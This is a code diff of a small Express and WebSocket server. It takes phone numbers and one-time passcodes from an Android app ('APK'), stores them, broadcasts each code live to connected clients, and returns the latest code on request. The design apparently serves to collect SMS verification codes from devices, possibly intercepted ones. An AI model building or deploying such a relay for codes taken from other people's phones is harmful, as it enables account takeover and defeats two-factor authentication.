@@ -5,7 +5,7 @@ const { WebSocketServer } = require('ws'); // Import WebSocket library
 const app = express();
 
 // In-memory storage for OTPs
-const otpData = [];
+const otpData = {}; // Example: { "1234567890": "987654" }
 
 // Array to store connected WebSocket clients
 const clients = [];
@@ -28,38 +28,46 @@ wss.on('connection', (ws) => {
     });
 });
 
-// Serve static HTML from 'public' folder
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Endpoint to receive phone and OTP
+// Endpoint to receive phone and OTP (sent by APK)
 app.get('/', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
 
-    if (!phone || !otp) {
+    if (!phone) {
         return res.status(400).json({
-            message: 'Phone number and OTP are required',
+            message: 'Phone number is required',
             status: 'error',
         });
     }
 
-    // Add new OTP to in-memory data
-    otpData.push({ phone, otp });
+    if (otp) {
+        // Log and store the OTP
+        otpData[phone] = otp;
 
-    // Notify all connected WebSocket clients
-    const message = JSON.stringify({ phone, otp });
-    clients.forEach((ws) => ws.send(message));
+        // Notify all connected WebSocket clients
+        const message = JSON.stringify({ phone, otp });
+        clients.forEach((ws) => ws.send(message));
 
-    res.status(200).json({
-        message: `OTP ${otp} received for phone ${phone}`,
-        status: 'success',
-    });
+        res.status(200).json({
+            message: `OTP ${otp} received for phone ${phone}`,
+            status: 'success',
+        });
+    } else {
+        // If no OTP is provided, return the latest OTP for the phone number
+        const lastOtp = otpData[phone];
+        if (lastOtp) {
+            res.redirect(`/?phone=${phone}&otp=${lastOtp}`);
+        } else {
+            res.status(404).json({
+                message: 'No OTP found for this phone number',
+                status: 'error',
+            });
+        }
+    }
 });
 
-// Endpoint to fetch all OTP data
-app.get('/fetch-otp-data', (req, res) => {
-    res.json(otpData);
-});
+// Serve static HTML from 'public' folder
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Start the server and attach WebSocket
 const server = app.listen(process.env.PORT || 3000, () => {
